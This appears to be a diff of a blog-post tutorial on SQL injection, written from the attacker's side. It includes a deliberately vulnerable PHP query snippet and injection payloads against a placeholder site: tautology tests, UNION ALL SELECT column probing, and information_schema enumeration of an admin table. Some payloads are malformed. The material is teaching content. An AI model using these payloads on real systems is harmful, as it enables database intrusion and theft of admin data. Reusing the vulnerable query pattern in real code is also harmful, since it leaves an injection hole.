@@ -41,7 +41,7 @@ And so I'm like, let me check and see if it's vulnerable to SQL injection. So I 
 </p>
 
 <p>
-<a href="http://www.vulnerablesite.com/promotion.php?id=1">http://www.vulnerablesite.com/promotion.php?id=1'</a><span style="text-decoration: underline;"><strong> or '1'='0</strong></span>
+<a href="http://www.vulnerablesite.com/promotion.php?id=1">http://www.vulnerablesite.com/promotion.php?id=1'</a><span style="text-decoration: underline;"><strong> or '1'='0</strong></span>
 </p>
 
 <p>
@@ -64,15 +64,15 @@ $id = $_GET['id'];
 
 //connect to DB server and select database
 
-$q = mysql_query(&quot;SELECT * FROM  products WHERE id='$id' &quot;);
+$q = mysql_query("SELECT * FROM  products WHERE id='$id' ");
 //pull out rows and spit them out
 while ($row = mysql_fetch_array($q))
 
 {
 
-echo &quot;Product name:&quot; . $row['name'];
+echo "Product name:" . $row['name'];
 
-echo &quot;Product description: &quot;. $row['desc'] ;
+echo "Product description: ". $row['desc'] ;
 
 }
 {% endhighlight %}
@@ -98,7 +98,7 @@ Notice what he just did. Since that last colon is not being escaped, the new que
 </p>
 
 <p>
-<strong>SELECT * FROM  products WHERE id=' 9'' </strong>
+<strong>SELECT * FROM  products WHERE id=' 9'' </strong>
 </p>
 
 <p>The query is wrong! This will issue an mysql error. and actually, this is a very good way to test for vulnerabilities. whenever in doubt, just add a colon!</p>
@@ -118,7 +118,7 @@ We didn't close the last colon because the php query will close it for us ;)
 <p>
 
 
-<strong>SELECT * FROM  products WHERE id=' 9' or <span style="text-decoration: underline;">'1'='1'</span></strong>
+<strong>SELECT * FROM  products WHERE id=' 9' or <span style="text-decoration: underline;">'1'='1'</span></strong>
 </p>
 <p>
 And now the query should work just fine. Here's another test that you can do to test for vulnerability:
@@ -139,13 +139,13 @@ let's modify the url to the following:
 </p>
 
 <p>
-<strong>http://www.vulnerablesite.com?id=9' UNION ALL SELECT  1 FROM users AND '1'='1</strong>
+<strong>http://www.vulnerablesite.com?id=9' UNION ALL SELECT  1 FROM users AND '1'='1</strong>
 </p>
 <p>
 Okay so before explaining, let's lay out the new query:
 </p>
 <p>
-<strong>SELECT * FROM  products WHERE id='UNION ALL SELECT  1 FROM users AND '1'='1'</strong>
+<strong>SELECT * FROM  products WHERE id='UNION ALL SELECT  1 FROM users AND '1'='1'</strong>
 </p>
 <p>
 Hmm, so what's this new query. What we did is we added another query to the existing one, and we did a UNION ALL to the results of both queries. a UNION ALL means BOTH queries will be processed, and both will be pulled out. You have access to his database now!!!! You can read more about unions <a href="http://dev.mysql.com/doc/refman/5.0/en/union.html">here</a> .
@@ -165,7 +165,7 @@ I forgot to mention that the UNION in SQL needs to have equal number of columns.
 </p>
 
 <p>
-<strong>SELECT * FROM  products WHERE id='UNION ALL SELECT  1,2 FROM users AND '1'='1'</strong>
+<strong>SELECT * FROM  products WHERE id='UNION ALL SELECT  1,2 FROM users AND '1'='1'</strong>
 </p>
 
 <p>
@@ -173,7 +173,7 @@ And if that doesn't work ....
 </p>
 
 <p>
-<strong>SELECT * FROM  products WHERE id='UNION ALL SELECT  1,2,3 FROM users AND '1'='1'</strong>
+<strong>SELECT * FROM  products WHERE id='UNION ALL SELECT  1,2,3 FROM users AND '1'='1'</strong>
 </p>
 
 <p>
@@ -199,7 +199,7 @@ Which is your DB name. So now you can modify the query to the following to displ
 </p>
 
 <p>
-<strong>http://www.vulnerablesite.com/product.php?id=-1'UNION ALL SELECT table_name,12,3,4,5,6,7 FROM information_schema.tables<span style="text-decoration: underline;">  schema_name='&lt;DB_NAME&gt;</span> WHERE '1'='1</strong>
+<strong>http://www.vulnerablesite.com/product.php?id=-1'UNION ALL SELECT table_name,12,3,4,5,6,7 FROM information_schema.tables<span style="text-decoration: underline;">  schema_name='&lt;DB_NAME&gt;</span> WHERE '1'='1</strong>
 </p>
 
 <p>
@@ -211,7 +211,7 @@ Okay so you found out about all the tables (dangerous) Now you need to find a ta
 </p>
 
 <p>
-<strong>http://vulnerablesite.com/product.php?id=-9' union all select 1,2,column_name,4,5,6,7,8 from information_schema.columns where '1'='1'  AND table_name='tbl_admin</strong>
+<strong>http://vulnerablesite.com/product.php?id=-9' union all select 1,2,column_name,4,5,6,7,8 from information_schema.columns where '1'='1'  AND table_name='tbl_admin</strong>
 </p>
 
 <p>
